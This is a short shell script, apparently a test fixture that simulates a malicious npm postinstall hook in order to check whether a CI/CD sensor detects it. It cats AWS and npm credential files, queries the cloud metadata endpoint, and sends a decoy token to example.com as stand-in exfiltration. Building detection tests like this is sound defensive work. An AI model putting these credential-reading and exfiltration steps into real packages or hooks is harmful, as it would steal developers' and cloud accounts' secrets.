#!/usr/bin/env sh
# ---------------------------------------------------------------------------
# Simulated supply chain attack payload — FOR DETECTION TESTING ONLY.
#
# This script mimics what a compromised npm package's postinstall hook would
# do. It does NOT exfiltrate any real data:
#   - the credential file it reads is a planted decoy (well-known AWS example key)
#   - the "exfiltration" target is example.com, which does nothing with the data
#
# The point is to see whether cicd-sensor flags these three behaviours.
# ---------------------------------------------------------------------------

echo "[payload] simulated attack starting"

# (1) Read credential-like files
echo "[payload] reading credential files"
cat "$HOME/.aws/credentials" 2>/dev/null || true
cat "$HOME/.npmrc" 2>/dev/null || true

# (2) Access cloud metadata endpoint (169.254.169.254)
echo "[payload] touching cloud metadata endpoint"
curl -s --max-time 3 http://169.254.169.254/latest/meta-data/ >/dev/null 2>&1 || true

# (3) Exfiltrate to an external host (benign sink)
echo "[payload] simulating exfiltration to external host"
curl -s --max-time 3 "https://example.com/collect?token=DECOY" >/dev/null 2>&1 || true

echo "[payload] done"
